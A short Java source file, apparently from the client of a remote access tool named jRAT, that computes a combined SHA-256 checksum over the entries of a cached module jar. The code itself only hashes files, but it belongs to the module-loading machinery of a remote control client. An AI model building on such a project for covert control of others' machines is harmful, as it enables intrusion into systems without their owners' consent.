package jrat.client.modules;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.security.MessageDigest;
import java.util.jar.JarEntry;
import java.util.jar.JarInputStream;


public class CachedModuleLookup {

    public static byte[] lookupSum(String mainClass) throws Exception {
        File file = CachedModule.getFile(mainClass);

        if (!file.exists()) {
            throw new FileNotFoundException();
        }

        byte[] sum = new byte[32];

        JarInputStream jis = new JarInputStream(new FileInputStream(file));

        JarEntry entry = null;
        while ((entry = jis.getNextJarEntry()) != null) {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buffer = new byte[1024];
            MessageDigest digest = MessageDigest.getInstance("SHA-256");

            int r;
            while ((r = jis.read(buffer)) != -1) {
                baos.write(buffer, 0, r);
                digest.update(buffer, 0, r);
            }

            byte[] entrySum = digest.digest();

            for (int i = 0; i < sum.length; i++) {
                sum[i] ^= entrySum[i];
            }
        }

        return sum;
    }
}
